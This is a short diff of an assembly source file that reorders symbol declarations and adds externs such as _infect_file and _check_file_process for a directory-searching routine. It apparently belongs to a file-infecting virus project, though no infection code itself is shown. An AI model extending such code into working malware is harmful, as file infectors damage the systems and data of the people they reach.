@@ -2,12 +2,16 @@
 %include "data.inc"
 
 section .text
-
-extern _move_through_dir
-extern _exit
-
-global _search_dir
-global _move_through_dir
+	extern _infect_file
+	global _move_through_dir
+	global _search_dir
+	extern _exit
+	extern _ft_isnum
+	extern _ft_strcpy
+	extern _ft_strcmp
+	extern _ft_concat_path
+	extern _check_file_process
+	extern _ft_strlen
 
 _search_dir:
 	; check for process running
